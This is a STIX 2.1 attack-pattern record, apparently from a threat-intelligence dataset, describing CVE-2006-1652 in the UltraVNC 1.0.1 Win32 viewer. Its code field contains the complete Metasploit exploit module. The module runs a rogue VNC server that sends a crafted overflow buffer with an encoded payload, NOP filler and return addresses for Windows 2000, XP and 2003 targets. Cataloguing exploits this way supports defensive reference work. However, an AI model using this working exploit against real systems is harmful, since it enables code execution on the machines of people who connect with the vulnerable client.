{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14db9d68-9f7d-4bbb-94aa-c3b61a17c070",
    "created": "2024-08-14T16:48:51.358895Z",
    "modified": "2024-08-14T16:48:51.3589Z",
    "name": "UltraVNC 1.0.1 Client Buffer Overflow",
    "description": " This module exploits a buffer overflow in UltraVNC Win32 Viewer 1.0.1 Release. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/vnc/ultravnc_client.rb",
            "external_id": "ultravnc_client.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-1652"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'UltraVNC 1.0.1 Client Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow in UltraVNC Win32\n        Viewer 1.0.1 Release.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-1652' ],\n          [ 'OSVDB', '24456' ],\n          [ 'BID', '17378' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\",\n          'MaxNops'  => 0,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4 English',\t{ 'Ret' => 0x7c2ec68b } ],\n          [ 'Windows XP SP2 English',\t{ 'Ret' => 0x77dc15c0 } ],\n          [ 'Windows 2003 SP1 English',\t{ 'Ret' => 0x76aa679b } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-04-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The VNCServer daemon port to listen on\", 5900 ])\n      ])\n  end\n\n  def on_client_connect(client)\n\n    rfb = \"RFB 003.006\\n\"\n\n    client.put(rfb)\n  end\n\n  def on_client_data(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    filler = make_nops(980 - payload.encoded.length)\n\n    sploit =  \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x06\" + \"Requires Ultr@VNC Authentication\\n\"\n    sploit << payload.encoded + filler + [target.ret].pack('V')\n    sploit << \"PASSWORD\" + [0xe8, -997].pack('CV')\n\n    print_status(\"Sending #{sploit.length} bytes to #{client.getpeername}:#{client.peerport}...\")\n    client.put(sploit)\n\n    handler\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-04-04",
    "x_mitre_platforms": [
        "win'"
    ]
}